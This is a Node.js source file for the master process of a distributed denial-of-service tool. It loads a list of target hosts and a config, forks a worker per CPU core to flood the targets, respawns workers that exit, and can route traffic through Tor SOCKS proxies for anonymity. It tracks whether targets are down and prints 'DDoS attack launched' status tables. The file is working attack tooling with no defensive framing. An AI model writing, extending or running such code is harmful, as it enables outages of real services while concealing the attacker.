import cluster from 'cluster';
import { cpus } from 'os';
import process from 'process';
import { readFile } from 'fs/promises';
import { resolve } from 'path';
import { DATA_MSG, EXIT_MSG } from './constants.mjs';
import { checkIfTorIsStartedOrExit } from "./utils.mjs";

let configPath, targetsPath;

const configMessages = [];

const startTimestamp = Date.now();
const perRequestStats = {};

let statTimer;

function isDefined(value) {
	return value !== null && value !== undefined;
}

async function getConfig() {
	return JSON.parse(await readFile(new URL(configPath, import.meta.url)));
}

async function getTargets() {
	return JSON.parse(await readFile(new URL(targetsPath, import.meta.url)));
}

function verifyUserConfig(userConfig) {
	if (!isDefined(userConfig.requestPerBatch)) {
		configMessages.push('-- "requestPerBatch" not specified in the config.json. Fallback to 10.');
	}
	if (!isDefined(userConfig.logEveryMs)) {
		configMessages.push('-- "logEveryMs" not specified in the config.json. Fallback to 1000ms.');
	}
	if (!isDefined(userConfig.delayBetweenBatch)) {
		configMessages.push('-- "delayBetweenBatch" not specified in the config.json. Fallback to 0ms.');
	}
	if (userConfig.cpuUsageRatio && (userConfig.cpuUsageRatio < 0 || userConfig.cpuUsageRatio > 1)) {
		throw new Error('cpuUsageRatio must be between 0 and 1.');
	}
}

function logStats(cpuCount, isUsingAnonymisation) {
	process.stdout.write('\x1Bc')
	const elapsedTime = ((Date.now() - startTimestamp) / 1000).toFixed(3);
	const preparedTableStats = Object.keys(perRequestStats).map(key => {
		return perRequestStats[key].details;
	});
	console.table(preparedTableStats);
	console.info('DDoS attack launched on        ', new Date().toLocaleString());
	console.info('Available CPU(s)               ', cpuCount ?? 0);
	console.info('Worker(s) running              ', Object.keys(cluster.workers).length ?? 0);
	console.info('Total requests sent            ', Object.values(perRequestStats).reduce((count, data) => {
		count += Object.values(data)[0].requests;
		return count;
	}, 0));
	console.info('Anonymised requests            ', isUsingAnonymisation ? 'Yes' : 'No');
	console.info('Time elapsed since launching   ', elapsedTime, 'second(s)');
	if (configMessages.length) {
		console.info('User config messages:\n', configMessages.join('\n'));
	}
}

function aggregateWorkersStats(workerData) {
	const { host, port, path } = workerData;
	const key = host + ':' + port + path;
	perRequestStats[key] = perRequestStats[key] || {
		details: { host, port, path, requests: 0, errors: 0, success: 0 }
	};
	perRequestStats[key].details.success += workerData.success;
	perRequestStats[key].details.errors += workerData.errors;
	perRequestStats[key].details.requests += workerData.requests;
	perRequestStats[key].details.isDown = workerData.isDown ? 'Server down' : 'Server up';
}

export async function startMaster() {
	const argv = process.argv.splice(2, 3);

	if (!argv.length) {
		throw new Error('Missing arguments path to targets.json and config.json');
	}

	configPath = resolve(process.cwd(), argv.pop());
	targetsPath = resolve(process.cwd(), argv.pop());

	console.info('using targets from path', targetsPath);
	console.info('using config from path', configPath);

	const { data } = await getTargets();
	const userConfig = await getConfig();
	verifyUserConfig(userConfig);

	const preparedUserConfig = {
		requestPerBatch: 10,
		logEveryMs: 1000,
		delayBetweenBatch: 0,
		...(userConfig)
	};

	if (preparedUserConfig.socksProxies?.length) {
		for (const proxy of preparedUserConfig.socksProxies) {
			await checkIfTorIsStartedOrExit(proxy).catch(() => {
				console.error('ERROR! Unable to reach Tor. Please, check that your tor service is started. Alternatively, check your config.json "socksProxies" value.');
				process.exit(1);
			});
		}
	}

	const numCPUs = cpus().length;
	const numCpuToUse = Math.round((userConfig.cpuUsageRatio ?? 1) * numCPUs);
	for (let i = 0; i < numCpuToUse; ++i) {
		cluster.fork({
			USER_CONFIG: JSON.stringify(preparedUserConfig),
			TARGETS: JSON.stringify(data)
		});
	}

	cluster.on('message', (worker, msg) => {
		if (msg.cmd === DATA_MSG) {
			aggregateWorkersStats(msg.data);
		}
	});

	cluster.on('exit', () => {
		cluster.fork({
			USER_CONFIG: JSON.stringify(preparedUserConfig),
			TARGETS: JSON.stringify(data),

		});
	});

	process.on(EXIT_MSG, () => {
		clearInterval(statTimer);
		console.info('DDoS attack stopped on', '        ' + new Date().toLocaleString());
	});

	const isUsingAnonymisation = userConfig?.socksProxies?.length;
	statTimer = setInterval(() => logStats(numCPUs, isUsingAnonymisation), userConfig.logEveryMs);
}
